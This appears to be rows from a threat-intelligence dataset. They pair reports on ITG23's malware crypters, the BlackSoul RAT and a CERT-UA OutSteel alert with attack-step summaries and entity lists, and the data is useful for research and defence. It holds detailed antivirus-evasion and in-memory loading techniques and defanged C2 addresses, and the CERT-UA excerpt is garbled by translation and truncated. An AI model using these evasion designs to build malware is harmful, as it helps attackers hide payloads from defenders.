issuance of crypts and BK* already, one customer takes in batches of 30-100 pieces) September 24, 2021: Neo → Zevs: монт молчит, я крипты готовил 3 штуки к 8 по мск (Mont is silent, I prepared 3 crypts by 8 Moscow time)*We assess БК (BK) likely is a reference to BazarLoader based on analyzing multiple chat references to this acronym.Emotet and IcedID: Longtime PalsThe use of ITG23 crypters with Emotet and IcedID malware is the latest evidence of a close relationship with these groups that has featured distributing each other’s malware and cooperating on malware development. Emotet first appeared in 2014 as a banking trojan and later emerged as a prominent downloader for other banking trojans, including IcedID, Qakbot, and Trickbot. IcedID, also known as Bokbot and often referred to by ITG23 as Anubis, is a banking trojan first discovered by X-Force in September 2017. Since that time IcedID — like many banking trojans — has evolved to include backdoor and data harvesting capabilities and is often used as a downloader for other malware, including Cobalt Strike and ransomware.Emotet: ITG23 and the Emotet group have a history of seeding each other’s malware. ITG23 has used Emotet extensively to deliver Trickbot malware often leading to the notorious Emotet -> Trickbot -> Ryuk ransomware attack sequence. Following actions to disrupt Trickbot group operations in fall 2020, Emotet moved quickly to assist ITG23’s recovery by downloading Trickbot malware to infected machines. A year later, ITG23 returned the favor by seeding Emotet samples to facilitate Emotet’s return following the January 2021 international law enforcement operation against the group.The presence of “Veron” aka “Mors” participating in conversations with ITG23 members in the leaked chats also points to ITG23’s close cooperation with Emotet. Historically, “mors” was a gtag used with Trickbot samples delivered by Emotet. Based on the conversations, Veron/Mors appears to be a liaison to ITG23 for Emotet related matters. Veron/Mors also seemed to work with the crypting team, and messages can be found from Bentley which discuss crypting files for Veron. Bentley sent the following messages to Veron and Stern between February and May 2021 possibly related to crypting Emotet samples for testing purposes before Emotet’s reappearance in November: February 24, 2021: Stern → Bentley: veron запустился? (Veron started?)4/19Bentley → Stern: Он начинает в марте. Работаем над криптами для него. наших криптора (He starts in March. We're working over the crypters for him. Our crypters) March 1, 2021: Stern → Bentley: veron не начал еще? (Veron hasn't started yet?) Bentley → Stern: Првиет. Еще не начанал. Сделали годеый крипт его длл. Ждем как даст полную версию со всеми ньюансами (Hi. Not started yet. Made a suitable crypter for his dll. We're waiting for a full version with all the nuances.) May 5, 2021 Bentley → Veron: Можешь дать длл на крипт? Пока можем начать криптовать и готовить стабы (Can you give a dll for the crypt? For now, we can start to crypt and prepare stubs)Messages between Veron and Stern in May 2021 seem to suggest that the return of Emotet may have been delayed due a need to rewrite parts of the code for security purposes. May 18, 2021: Stern → Veron: привет. когда стартуем? (Hi, when are we starting?) Veron → Stern: привет, я скажу когда точно, в ближайшее время уже, делаю чтобы не взломали (Hello, I'll tell you exactly when, in the near future already, I'm doing it so that they don't get hacked) May 24, 2021: Veron → Stern: привет, сорри, что задерживаем, но надо переписать часть, я за безопасность напиши как будешь, если вопросы есть (hello, sorry for the delay, but we need to rewrite part, I'm for security let me know if you have any questions)IcedID: The first evidence of ITG23’s cooperation with the IcedID group appeared in May 2018 when security researchers observed IcedID downloading Trickbot malware. Several months later other researchers noted Trickbot returning the gesture and downloading an updated IcedID variant that incorporated features used with Trickbot samples, suggesting that the two groups also collaborated on development. In early 2019, other analysts observed IcedID using a custom Trickbot shareDLL module to download core Trickbot malware. These researchers a month later described a new Trickbot proxy module for man-in-the-middle (MITM) attacks against web browsers that was highly similar to the IcedID proxy module. A Trickbot module named anubisDll32 was also developed containing the IcedID core code. In November 2021, X-Force and other researchers observed multiple campaigns during which BazarLoader was used to download IcedID malware.ITG23’s leaked chats provide additional insight into ITG23’s close relationship with IcedID, although the exact nature of this relationship remains unclear. On May 1, 2021, Stern congratulates “Leo” on his “cool bot IcedID” for gaining the attention of security researchers, revealing that Leo is likely affiliated with the IcedID group. Stern → Leo: а твой крутой бот ICEDld (and your cool ICEDId bot) Stern → Leo: про него пишут исследователи (researchers write about it) Stern → Leo: что ты сейчас на первом месте (that you're in the first place)The leaked chats often refer to a “Project Leo”, which we assess is a reference to IcedID. Bentley regularly provides Mango with updates on crypting related to “Project Leo” and in November 2021, Stern messaged the following5/19instruction to Bentley: Stern → Bentley: ""включи крипты лео (turn on the crypts of Leo)""IcedID and MountLocker RansomwareX-Force uncovered evidence that ITG23 crypters were used with MountLocker (see below), a ransomware-as-a- service (RaaS) operation that has been active since July 2020. Since then, MountLocker has rebranded several times to other names including XingLocker, AstroLocker, and Quantum. This evidence — combined with code overlap between IcedID and MountLocker ransomware and the use of IcedID alongside MountLocker during multiple ransomware attacks — suggests that the IcedID group operates the MountLocker RaaS.The following conversation between Stern and Bentley on May 6, 2021, provides additional evidence that Leo, who operates IcedID, also has some involvement with ransomware. Stern asks Bentley which ‘lockers’, aka ransomware, his team have been crypting, and Bentley responds that they have had binaries from Reshaev and from Leo. Reshaev is a developer/manager for the Conti ransomware. Stern: как автобилды работают? Bentley: Большая часть стабов уже работают. Выдаем локеры ехе 32 64 длл 32 64 , кобу 32 64 как ехе так и длл. Шелкоды в ехе и длл. Простые длл, БК. Stern: какие локеры Bentley: от решаева в ехе и от лео в длл Stern: How's the autobuild working? Bentley: Most of the stubs are already working. We issue lockers exe 32 64 dll 32 64, cobalt 32 64 as exe and dll. Shellcode in exe and dll. Simple Dll, BK. Stern: Which lockers? Bentley: From Reshaev in exe and from Leo in DllAnalysis of IcedID and MountLocker samples reveals areas of code overlap, particularly in the logging and decryption functions. Both IcedID and MountLocker generate extensive debug logs, which are formatted in an almost identical manner.Figure 1 — Debug log strings from an IcedID sample6/19Figure 2 — Debug log strings from a MountLocker sampleAdditionally, samples of both IcedID and MountLocker were identified which contained almost identical XOR decryption and key generation algorithms.Figure 3 — XOR algorithm and key generation function from an IcedID sample7/19Figure 4 — XOR algorithm and key generation function from a MountLocker sampleQakbot: A New Partner?While monitoring for signs of ITG23 crypters’ use in the wild, X-Force identified the first known use in late February 2022 of an ITG23 crypter with Qakbot aka Qbot. The Qakbot banking trojan was first identified in 2007 and like other banking trojan groups, it has increased its functionality over the years and evolved into a flexible downloader and backdoor often leading to ransomware attacks. The appearance of ITG23 crypters on Qakbot samples provides evidence of a direct relationship between ITG23 and the Qakbot group. The relationship between ITG23 and Qakbot is also supported by additional evidence published recently. That said, the discovery does not come as a complete surprise. In the leaked chats, “Tramp” asked Bentley on December 6, 2021, about crypting Qakbot: Tramp → Bentley: криптанем квак бота ? (crypt Quak Bot?) Bentley → Tramp: давай попробуем (let's try)Tramp later sends Bentley a file named stager_1_tr.dll to be crypted. Tramp may be affiliated with “TR”, a prominent distribution affiliate also known as TA577 and which is currently distributing Qakbot. We have since identified ITG23 crypters used with Qakbot samples delivered by the two most prominent and current Qakbot distribution affiliates — TA570 and TA577 — suggesting that ITG23 is assisting the Qakbot group with crypting its malware and not just a single distribution affiliate. There is also evidence that Qakbot has a relationship with the Emotet group, dating back several years. Emotet has historically been used to download Qakbot in addition to Trickbot, for example during 2020 and then more recently in March 2022. Given ITG23’s partnership with Emotet, it is possible that the Emotet group is facilitating ITG23’s relationship with Qakbot leading to the latter’s use of an ITG23 crypter.Hive0106 (TA551) Gozi SampleX-Force researchers also found a Gozi sample using an ITG23 crypter on April 7, 2022 (see below). Gozi is also a banking trojan first appearing in 2007 that has evolved into a multi-module, multi-purpose malware. However, unlike the other banking trojans discussed so far, the Gozi source code has leaked and the malware is not operated or developed by a single group. The threat actor Hive0106 (aka TA551) was likely responsible for this campaign delivering Gozi. We assess that Bentley and his team likely crypted this Gozi sample on behalf of this group, with which they have an established relationship. The CryptersCrypters are applications designed to encrypt and obfuscate malware to protect it from anti-virus scanners and malware analysts. The crypting process generally involves encrypting a pre-compiled malware payload, such as an8/19EXE, DLL file, or shellcode, and embedding it within a secondary binary, known as a ‘stub’, which contains code to decrypt and execute the malicious payload. The stubs generally take the form of binaries, such as Exe or DLL files, are often either polymorphic or updated frequently in order to evade signature-based detection methods, and usually make use of code obfuscation techniques.When the crypted binary is executed, the stub code will extract the embedded payload, decrypt it, load it into memory and execute it. As a result of this behavior, the crypted binary containing the stub code may also be referred to as a ‘loader’ or ‘in-memory dropper’.In order to protect their payloads many crypters may also include additional functionality to detect sandbox environments, hinder AV scanners, escalate privileges, or perform other basic system checks. It’s common for crypters to utilize a high level of code obfuscation within the stubs, and the majority also employ polymorphic techniques such as metaprogramming to ensure that each crypted binary is unique and thus make it harder to identify via signature-based detection methods.Another common technique is for the crypter to disguise the malware as a benign executable, and to this end, they will often use source code from legitimate applications as a template for the stub binary, or include strings or functions which mimic benign activity. The code to decrypt and load the payload will be made as inconspicuous as possible in an effort to hide it from the attention of malware scanners.All of these techniques together also provide obstacles for the malware reverse engineer and make it harder to write detection signatures and automated malware parsers.X-Force research indicates that ITG23 is providing crypting services to other threat actors in addition to using them for their own malware. Using the same crypter for multiple malware families has an additional benefit of confusing the identification capabilities of AV applications. Indeed, it is not uncommon to see a crypted malware binary flagged by AV as belonging to one malware family, when it is in fact a completely different one, and they just happen to be using the same crypter.X-Force analysts are tracking at least thirteen crypters we believe to be developed and currently in use by ITG23 that we are calling Dave, Pear, Lore, Mirror, Galore, Rustic, Tron, Hexa, Stub, Error, Skeleton, Charm, and Graven. Whilst variants of the Dave RC4 crypter have been in use for at least a couple of years, the rest appear to have been primarily developed in the past year. ITG23 has used these crypters with Trickbot, BazarLoader and Conti malware — all of which are attributed to ITG23 — and used them to crypt malware on behalf of groups such as IcedID and Emotet. We have also observed these crypters used with Cobalt Strike samples, which we assess are used by ransomware internal red teams or affiliates when conducting attacks on clients infected with Trickbot, BazarLoader, IcedID or Emotet.In the sections below, we provide an overview of each of the crypters and the examples of the malware families they have been used with.DaveDave is one of the older crypters that X-Force tracks as currently in use by ITG23, having been used since at least 2020. Several variations of Dave exist, but one of the most common variants stores the payload either as an RCData type resource or within the data section, and decrypts it using a custom RC4 algorithm, which uses a variable sbox size rather than the standard for RC4 which is 256 bytes. Dave is so-called as it commonly wraps the payload in a second-stage shellcode loader, where the ascii string ‘dave’ is used to mark the end of the payload. Dave loaders have been most frequently observed loading Emotet and Trickbot, but also occasionally BazarLoader, Ryuk, Conti, IcedID, Cobalt Strike and Colibri.It is common practice for malware developers to ‘strip’ malware binaries during compilation which removes symbol information such as variable and function names. This has the benefits of making the malware more difficult to analyze, as well as removing details, which may potentially be used by analysts to fingerprint the developer.Almost all samples analyzed by X-Force are fully stripped, however from November 2021 to January 2022 X-Force observed a number of unstripped Dave-crypted samples uploaded to repositories such as VirusTotal, providing a rare9/19insight into the coding style of the developer. Based off some of the strings and function names X-Forced determined the developer utilized components of publicly available code for the stub, for example, the function CLoad::FromMemory() can be traced back to a 2016 code sample, memlib.cpp, originally published on a forum. The aforementioned shellcode with the ‘dave’ signature also appears to be modified from the open source sRDI repository.Figure 5 — Unstripped Dave stub with original function and variable names as assigned by the developer.Select samples using the Dave crypter:Sample Family SHA256 Hash observed in use with IcedID payloads, but samples loading BazarLoader, Trickbot, and Colibri payloads have also been found. Pear crypter stores the payload within one of the stub binary’s data sections, and custom algorithms are used to encrypt the payload. The exact format and values of the encryption algorithm change per sample, suggesting a technique such as metaprogramming may have been employed to generate the algorithms. The encrypted payload often has a recognizable alternating byte pattern that makes use of a restricted set of bytes in order to keep the entropy low. Entropy measures the level of randomness in the data, and many encryption algorithms will generate encrypted data with a distinctively high entropy value, which is easily detectable by binary analysis tools. By using an algorithm that outputs lower-entropy data, the encrypted payload is less easy to detect by automated systems.Figure 6 — Pear crypted sample with distinctive encrypted payload utilizing a restricted byte set.Select samples using the Pear crypter:Sample Family SHA256 Hash Trickbot, BazarLoader, IcedID and Cobalt Strike. This crypter stores the payload as a BITMAP type resource, with a 103-byte bitmap file header added to the start of the payload data. Upon execution, the stub code loads the resource, removes the bitmap header, and decrypts the remaining data using XOR and a hardcoded key. The payload is then loaded into memory and executed. The crypter originally appeared to be designed for use with PE payloads, and so shellcode-based payloads were wrapped in an additional second stage loader.Lore crypted binaries often include a lot of extraneous imports and junk functions in an attempt to obscure the location of the payload decryption and loading code from analysts. This loading code instead uses API hashes to11/19retrieve handles to the API functions it requires, so the extraneous imports can generally be ignored by the analyst.A handful of Lore crypted samples were identified containing the following PDB paths: c:\jenkins\workspace\crypter5_generic_exe\Bin\x64\Release\MFC_Stub.pdb c:\jenkins\workspace\crypter5_shellcode_64_exe\Bin\x64\Release\MFC_Stub.pdb c:\jenkins\workspace\crypter5_generic_exe\Bin\x86\Release\MFC_Stub.pdb c:\jenkins\workspace\crypter5_shellcode_64_exe\Bin\x64\Release\MFC_Stub.pdbThese paths provide evidence of a Jenkins server being used for crypting operations and also suggest that it likely contains a number of different crypters, with crypter5 being Lore Crypter. This is corroborated by the PDB path found within some Error crypted samples, detailed further below, which refer to it as ‘crypter7’.The directory names ‘crypter5_generic_exe’ and ‘crypter5_shellcode_64_exe’ indicate that different configurations of the crypter stubs were likely compiled for different types of payloads. In this case, the two samples containing the reference ‘crypter5_shellcode_64_exe’ are both 64-bit executable files that contain Cobalt Strike shellcode http stagers as their payloads. For the two samples containing the reference ‘crypter5_generic_exe’, one is a 64-bit executable containing a BazarLoader payload and the other is a 32-bit executable containing a Conti ransomware executable.Select samples using the Lore crypter:Sample Family SHA256 Hash payloads, as well as some IcedID and Cobalt Strike. Mirror crypter shares some code overlap and obfuscation mechanisms with Lore crypter, suggesting they may have the same developer or codebase. Mirror splits its encrypted payload into three parts which are stored across different sections of the resulting binary loader. Two main variants of the Mirror stub code have been found so far, one which decrypts the payload using AES-256 via the Windows CryptDecrypt API, and a second which decrypts the payload using XOR and a hardcoded key.Select samples using the Mirror crypter:SHA256 HashSample Family with alternative languages, producing crypters with loader stubs written in both the Go and Rust programming12/19languages. Galore crypter uses the Go programming language and has been observed in the wild since mid-2021 when it was frequently used to crypt BazarLoader payloads. The Go programming language has become increasingly popular with malware authors over the past few years due to its convenient cross-platform support, and the fact that it produces large and complex binaries upon compilation which can be tricky to reverse engineer and often have lower detection rates against AV applications than their C/C++ coded counterparts.Upon execution the Galore stub code decrypts the payload using XOR, and loads and executes the PE payload using code based off the open-source Reflective DLL Injection project. The use of this Reflective Dll Injection code is common in many of ITG23’s crypters.Select samples using the Galore crypter:Sample Family SHA256 Hash malware developers. The payload is stored in the .rdata section of the loader and encrypted using a XOR based algorithm with two keys applied in multiple iterations. The crypter supports both shellcode and PE payloads, with shellcode payloads loaded into memory and executed directly, and PE payloads loaded in a similar manner to Galore crypter, using the Reflective DLL Injection technique.Rustic crypted samples were first observed in early September 2021 and it has been used with malware including BazarLoader, IcedID, Cobalt Strike, Quantum, as well as implants from Sliver which is a post-exploitation framework written in Go.13/19Figure 7 — Rustic stub loader code responsible for loading and decrypting the payloadFigure 8 — Strings within a Rustic-crypted sample indicate that the binary was written using the Rust languageSelect samples using the Rustic crypter:Sample Family SHA256 Hash gtag rob132. Since then, it has been observed with payloads within Emotet, Trickbot, BazarLoader, IcedID, Conti and Cobalt Strike. Of note, Tron is the crypter identified in this article from CERT-UA.Tron crypted binaries have their payload usually stored within the .text section of the stub loader which, upon execution, unpacks and decompresses the payload, and then loads it into memory and executes it. The decompression of the payload is performed using the Zlib library; however, the unpacking appears to be performed using code originating from an obscure Github project called Megatron (url specifically a module called ioBuffer.cpp which implements basic buffer manipulation and unpacking functions. The Megatron project has since been taken down but previously strings from the source code in Github could be observed within the unpacking functions in the crypted binaries.Figure 9 — The source code of ioBuffer.cpp as seen on GithubThe above image shows the source code of ioBuffer.cpp as seen on Github, specifically a function named inBuffer::get_8() is shown, which contains the error string “inBuffer::get_8: noenough“. This same function and error string can be seen within the unpacking functions of the crypted binary.15/19The payload data is split into chunks which are delimited with the bytes ‘c3 cc cc cc’, where the number of ‘cc’ bytes varies based on alignment. Bytes used to calculate the size of each chunk are added at the start of each chunk. The unpacking code parses the payload data, calculating the size of each chunk and appending the chunk data to the output buffer whilst checking for and discarding the 0xc3 and 0xcc padding bytes.The compressed and decompressed sizes are then parsed from the start of the unpacked data, and the zlib.decompress function is used to decompress the payload. One version of this crypter stores the payload in multiple parts, which are unpacked individually and then joined together before decompression.Several other variants of the Tron crypter have also been observed. One example contains the same ioBuffer unpacking functions, but the payloads are decrypted using XOR rather than decompressed using Zlib. Some variants also have the payload stored in the .data section, and others may encode the payload in a numeric ascii format.Some samples were identified containing path strings for header files such as the following: Z:\cr4\ballast\5\core\src\BitArray.h Z:\cr\crypter4\ballast\3\openjp2\opj_intmath.hConsidering the PDB strings identified within Lore and Error crypted samples, these path strings may indicate that Tron crypter is referred to as crypter4 within the group.Select samples using the Tron crypter:Sample Family SHA256 Hash entropy. This is then stored in the data sections of the stub binary, with some variants splitting the payload across two or three different sections. Upon execution the payload is reconstructed, decompressed and decrypted and then copied to a newly created memory section and execution transferred to the payload. Portable executable (PE) payloads may be preceded by a shellcode loader which is responsible for properly mapping the PE file into memory and executing it.Hexa makes use of code obfuscation techniques to hinder analysis efforts including splitting the code into many tiny blocks separated by jumps, and the inclusion of blocks of junk data.16/19Hexa crypted samples were observed towards the end of 2021, with payloads including BazarLoader, Cobalt Strike, and Conti. It has also seen an increase in usage over the past couple of months where it has been used with malware families including IcedID, QakBot and Gozi.Select samples using the Hexa crypter:Sample Family SHA256 Hash also been identified with payloads such as BazarLoader, Cobalt Strike, Conti, and Quantum ransomware, which is a variant of MountLocker and thought to be associated with the IcedID group.Stub crypter stores the payload across multiple RCDATA type resources with sequential ids, e.g. 200, 201, 202. The first resource contains the encryption key, and the remaining resources each hold an encrypted section of the payload PE file.To generate the encryption key, the malware takes the first resource, removes a 62-byte header, and then proceeds to generate each byte of the key by combining the next three bytes from the resource data using bitwise shift and or operations. The final key length is usually 1024 bytes. The malware then proceeds to decrypt the next resource using this key and a custom xor-based algorithm, which varies between samples. The first decrypted resource contains the PE header of the payload binary, and the loading code uses information from this header to map each of the remaining PE sections into memory as it decrypts them from the resources. The loaded payload is then executed at its entry point.Select samples using the Stub crypter:Sample Family SHA256 Hash IcedID and BazarLoader campaigns, as well as being used with Cobalt Strike payloads. Error crypted binaries contain a large amount of junk code and strings for obfuscation, with one variant seemingly designed to be disguised as a hospital administration tool. Some samples also contain strings, which appear to have been generated from literary texts such as ‘David Copperfield’.17/19Figure 10 — Error crypted sample containing strings relating to a hospital administration applicationError crypter encrypts its payload using XOR and the encrypted payload is divided into small chunks which are scrambled up and stored. Upon execution, the stub code uses a complicated series of functions to retrieve the data chunks and reconstruct the encrypted payload. The XOR key required for decryption is generated in a similarly convoluted manner, with data being decrypted and retrieved from various sources and concatenated to form a string. This string is then hashed, and the hash is used to generate the final XOR key.An example of one of the strings used to generate the XOR decryption key is as follows: 2021-12-03- mok.35022336.17:33:40===700524802745472.xKUzpAWUHQuKEHhnAwJ4MEDN4oDSNpNqXpt.2691200820897.3Error crypter also includes some anti-debugging functions within the stub code including checking for the presence of a debugger and checking the system time year against a hard coded value.Some Error crypted samples were found to contain the following PDB string: C:\\crypter7\\Bin\\x64\\Release\\Dll\\cryptERRDll.pdbThis PDB string suggests that this crypter may have been known as ‘crypter7’ or ‘cryptERR’ internally within ITG23.Select samples using the Error crypter:Sample Family SHA256 Hash loading payloads such as BazarLoader, Cobalt Strike, Conti, and MountLocker. Charm crypter compresses its payload using an arithmetic coding algorithm, and then xor encrypts the compressed data and splits it into many small segments which are stored throughout the loader binary. Charm crypted binaries are obfuscated using junk code to hinder analysis.18/19Select samples using the Charm crypter:Sample Family SHA256 Hash Each part is then split into small pseudo-randomly sized chunks, delimited with pseudo-randomly sized chunks of null bytes. The algorithm to determine both the size of payload chunks and null-byte chunks is deterministic with a fixed seed allowing for the payload to be reconstructed by the loader. Upon execution, the payload is rebuilt and decrypted using AES, then loaded into memory and executed. Some variants of Graven also include code to create a mutex BazarLoader, Emotet, and IcedID.Select samples using the Graven crypter:Sample Family SHA256 Hash the loader binary, often with just a hardcoded ascii string used as the XOR key. Upon execution, the payload resource is loaded, decrypted, and executed in memory. Variants have been found loading either shellcode or PE formatted payloads. PE payloads are mapped into memory, imports loaded, and then executed from their entrypoint. Skeleton crypted binaries have been observed loading Trickbot, Cobalt Strike and IcedID payloads between December 2021 and late March 2022.Select samples using the Skeleton crypter:Sample Family SHA256 Hash ","1. ITG23 develops crypters like Dave, Lore, Mirror, etc. to encrypt malware payloads. 2. ITG23 sets up an automated Build Machine using Jenkins to compile stub executables with encrypted payloads. 3. ITG23 uses the crypters to encrypt payloads from their own malware like Trickbot, BazarLoader, Conti ransomware. 4. ITG23 also provides crypting services to other groups, encrypting payloads from Emotet, IcedID, Qakbot, MountLocker ransomware. 5. The stub executables with encrypted payloads are distributed through campaigns using phishing, malspam, etc. 6. A victim executes the crypted stub executable. 7. The stub executable decrypts and executes the embedded malware payload in memory. 8. The malware payload carries out its malicious activities, e.g. banking fraud, ransomware encryption. 9. Data exfiltration and C2 communication occurs via the malware payload. 10. ITG23 and other groups monetize the access and data, e.g. through bank account theft, ransom demands. 11. The crypting and obfuscation used evades detection by security products. 12. Automated rebuilding of stubs with varying payloads also evades protections relying on signatures. ",valid_31,"['ITG23', 'Dave', 'Lore', 'Mirror', 'encrypt', 'payloads', 'Build Machine', 'jenkins', 'exe', 'use', 'the crypters', 'their own malware', 'Trickbot', 'BazarLoader', 'Conti ransomware', 'crypting services', 'other groups', 'Emotet', 'IcedID', 'QakBot', 'MountLocker ransomware', 'the stub', 'campaigns', 'decrypt', 'crypts', 'memory', 'the malware', 'data', '10', 'access', '11', 'the crypting', 'obfuscation', 'security', '12', 'stubs', 'signatures']",ITG23; Dave; Lore; Mirror; encrypt; payloads; Build Machine; jenkins; exe; use; the crypters; their own malware; Trickbot; BazarLoader; Conti ransomware; crypting services; other groups; Emotet; IcedID; QakBot; MountLocker ransomware; the stub; campaigns; decrypt; crypts; memory; the malware; data; 10; access; 11; the crypting; obfuscation; security; 12; stubs; signatures.
"ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malwarequointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malwareJanuary 5, 2021IntroductionOn 27 November, QuoIntelligence detected a new malware, seemingly uploaded to VirusTotal by a user in Turkmenistan, which shares multiple similarities to the threat actor we previously dubbed ReconHellcat. The campaign ultimately delivers a previously undocumented remote access Trojan (RAT), which we dubbed BlackSoul. After promptly alerting our customers, we notified Cloudflare about the C2 infrastructure hosted on their Workers service as per our responsible disclosure process.Further analysis revealed the malware being part of a targeted campaign, that likely originated with a spear phishing email delivering a CAB archive. Both the CAB and the file contained within are named 1-10-20-hb44_final to impersonate one of the documents available on the National Institute of Standards and Technology (NIST) website.Figure 1: CAB archive contentsFigure 2: Legitimate NIST document URL and filenameTechnical AnalysisLoader.ReconHellcatFile Name to VTFirst AV detection obfuscation similar to the variant observed in the previously reported ReconHellcat campaign delivering BlackWater malware. Another similarity is that the loader utilizes C2 infrastructure hosted on the Cloudflare Workers service. Following a successful C2 connection, the loader retrieves two files: (1) an executable named blacksoul, and (2) a Dynamic-Link Library (DLL) named blacksoulLib. Additionally, the loader opens Microsoft Word with the aforementioned legitimate document from the NIST website. Essentially, ReconHellcat uses this legitimate document as a decoy. The blacksoul and blacksoulLib files have compilation timestamps from 27 and 26 November, respectively.BlackSoulFile Name to VTFirst AV detection ReconHellcat threat actor. We named the malware “BlackSoul” to match its internal name, main class name, and file name.Figure 3: Class name “BlackSoul” The malware is a classical minimal RAT, which is capable of file transfers and running arbitrary commands. Through static analysis, we determined that the executable’s main loop supports handling the following commands from its C2 server:Command Field NamesActions Taken1 paramsExecutes a command and return the result.2 url and path ormedia and alternativeText3 pathsDownloads file(s) from a URL and stores them in a destination on the machine. Creates a destination folder if it does not already exist.Likely retrieves a specified file from the machine and uploads it to the C2.2/8Command Field NamesActions Taken4 configUpdates the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields.Table 1: BlackSoul Commands and Actions Taken BlackSoul makes use of two files:UsrClass.json: Contains a JSON configuration. It is unclear if this file is mandatory or merely used to save existing configurations between invocations of BlackSoul. UsrClass.data: Observed as a DLL with an Init() export, which we refer to as blacksoulLib and will describe in depth in the next section.BlackSoul uses information gathered by blacksoulLib to call back to the C2 over the RESTful Strapi protocol and JSON based data encoding.The RAT’s string obfuscation applies only to strings in the main program but excludes strings of third-party compiled in libraries. BlackSoul additionally uses various other techniques for obfuscation. In particular, strings are constructed dynamically on the stack and deobfuscated with a variety of mechanisms, such as a fixed key XOR cipher and a Caesar cipher using Submission to VTFirst AV detection rate2020-11-26 23:45:57Low (18/71)Figure 4: exports of the originally named blacksoulLib3/8The file is a DLL with a single export, Init(), which is called by BlackSoul. In this instance, its primary functions are:Searching the victim’s machine for Firefox, Chrome, and Opera data. If the browser data is not found, the program terminates early. Decoding a C2 URL later used by BlackSoul Decoding a Cloudflare DNS-over-HTTPS (DoH) URL. Generating further login information for the C2 and returning gathered data to BlackSoul in JSON format, including:A username with three random appended characters. A password consisting of 24 random characters.4/8Figure 5: C2 URL decryption and setting of the URL parameter Based on our observations, the DLL’s specific functionality adapts to various victims’ environments, and the DLL outputs different C2 information for various targets.VictimologyQuoIntelligence was unfortunately unable to uncover the entities targeted by this campaign. The only information at hand relies on:The VirusTotal submitter’s country (Turkmenistan)5/8The theme used as a lure (NIST)Due to the limited information available to determine victimology, we cannot definitively state a target. However, it is likely that the BlackSoul campaign targeted a government- related body based on the theme lure, since NIST develops and publicizes security compliance standard for the US Federal Government and any organization who handles government data. As well, previously observed ReconHellcat campaign targets consisted of primarily defense and diplomatic government bodies.AttributionWhen we initially discovered ReconHellcat, its campaign characteristics and Tactics, Techniques, and Procedures (TTPs) were unique enough to classify it as a new threat actor. During our analysis of the new BlackSoul campaign, we identified limited yet sufficient similarities overlapping with the earlier observed BlackWater campaign. As a result, we have high confidence attributing this attack to ReconHellcat.Similarities to earlier ReconHellcat campaigns:Lure themes of government related organization materials. Usage of compressed archives, likely via spear phishing email links or attachments, to distribute the initial attack artifacts. A three-stage attack scheme.Similarities between ReconHellcat‘s BlackSoul and BlackWater malware:Supports DNS-over-HTTPS (DoH) using cloudflare-dns.com. Has clear internal naming likely due to a lack of artifact cleanup in the malware build process. Resolves the C2 hostnames via DNS over HTTPS (DoH) using a built-in feature of libcurl, aclient-side URL transfer library. Contains paths and parameters to use Strapi – a content management system (CMS). Identical string obfuscation. Uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure. JSON–encoded communications. Similar kind of randomized login (user registration) scheme with the C2 server. Malware samples contain a ‘Black’ prefix in their naming schemes.To note, although we have not found a strong correlation or technical link between ReconHellcat and APT28, there are shared characteristics between the two groups, which we highlighted in our recent APT28 reporting.Appendix I – IOCshxxps://noisy-haze- af47.fromhell.workers.dev/uploads/Bl4ck_S0ul6s5_1d7704b469.blacksoulhxxps://noisy-haze- Initial AccessExecutionDefense EvasionTECHNIQUET1566: PhishingT1204: User ExecutionT1027: Obfuscated Files or InformationCredential AccessDiscoveryCollectionT1555: Credentials from Password StoresT1082 System Information DiscoveryT1005: Data from Local SystemCommand and Control T1132: Data EncodingT1105: Ingress Tool TransferT1572: Protocol TunnelingExfiltrationT1041: Exfiltration Over C2 ChannelT1020: Automated ExfiltrationDo you want to stay informed of cyber and geopolitical threats targeting your organization? Are you interested in receiving exclusive and unpublished intelligence?Get in touch!Join Our Newsletter!Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates!Only valid business emails will be approved.7/88/8 ","1. The threat actor distributed a spear phishing email containing a CAB file attachment impersonating a NIST document. 2. When the CAB file is executed, it extracts and runs the Loader.ReconHellcat executable. 3. The loader connects to a command and control server hosted on Cloudflare Workers infrastructure. 4. The C2 server sends the BlackSoul RAT executable and blacksoulLib DLL to the loader. 5. The loader runs BlackSoul, which imports functions from blacksoulLib. 6. blacksoulLib gathers system data and generates credentials for communicating with the C2 server. 7. BlackSoul sends commands and data to the C2 server over HTTPS using the Strapi API and JSON encoding. 8. The C2 server can send back commands to control the compromised machine. ",valid_19,"['the threat actor', 'a spear', 'email', 'CAB', 'NIST', 'the Loader', 'ReconHellcat', 'Table', 'a command', 'Control', 'Cloudflare Workers', 'the C2 server', 'The blacksoul', 'RAT', 'blacksoulLib', 'DLL', 'functions', 'data', 'credentials', 'commands', 'HTTPS', 'Strapi', 'JSON']",the threat actor; a spear; email; CAB; NIST; the Loader; ReconHellcat; Table; a command; Control; Cloudflare Workers; the C2 server; The blacksoul; RAT; blacksoulLib; DLL; functions; data; credentials; commands; HTTPS; Strapi; JSON.
"cert-gov-ua.translate.goog /article/18273 CERT-UAGeneral informationThe orderly command of the response on the computer of the supremacy of Ukraine CERT-UA took away the information about the rozpovsudzhennya, nachebto, in the name of the National Health Service of Ukraine, electronic mail notifications, which were sent to the ZIP-archiveZIP-archives guessing to avenge a decoy document and two identical shortcut files, when they appear on the victim’s computer, a powershell command will be written, which, in its turn, will lead to the capture and launch of the OutSteel program (compilation date: 28.01. 2022). It remains to secure the search for stolen documents on the victim's computer, as well as to grab and download the SaintBot program (compilation date: 04/30/2021).This activity is directed at the state organizations of Ukraine. Valid for CERT-UA no later than April 2021 under identifier UAC-0056.Indicators of compromiseFiles: load74h74830.exe 1406.exe (SaintBot)Мережеві: hxxps://cdn.discordapp[.]com/attachments/908281957039869965/937420906286952568/d5aadb4ace8ffcchxxp://eumr[.]site/up74987340.exe hxxp://eumr[.]site/load74h74830.exe hxxp://185.244.41[.]109:8080/upld/ hxxp://8003659902[.]space/wp-adm/gate.php hxxp://smm2021[.]net/wp-adm/gate.php hxxp://8003659902[.]site/wp-adm/gate.php 185.244.41[.]109 testsid@lthhc-zm[.]comХостові: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<назва_файлу>.exe %TEMP%\rmm.bat %TEMP%\svjhost.exe %LOCALAPPDATA%\zz%USER%\Додаткова інформаціяOutSteel - a slick program, divided into different versions of AutoIt; the main functionality is the transfer of files after a specific 